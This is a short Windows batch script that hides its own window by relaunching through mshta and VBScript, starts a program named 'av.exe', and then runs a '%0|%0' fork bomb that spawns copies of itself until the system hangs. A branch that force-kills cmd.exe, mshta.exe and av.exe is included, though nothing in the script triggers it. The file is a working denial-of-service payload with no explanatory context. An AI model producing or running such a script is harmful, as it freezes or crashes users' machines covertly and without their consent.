@echo off
SETLOCAL ENABLEEXTENSIONS
if "%1" == "h" goto m
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:m
if defined kill (goto b) else goto a

:a
start av.exe
%0|%0

:b
taskkill /f /im av.exe
taskkill /f /im mshta.exe
taskkill /f /im cmd.exe
exit
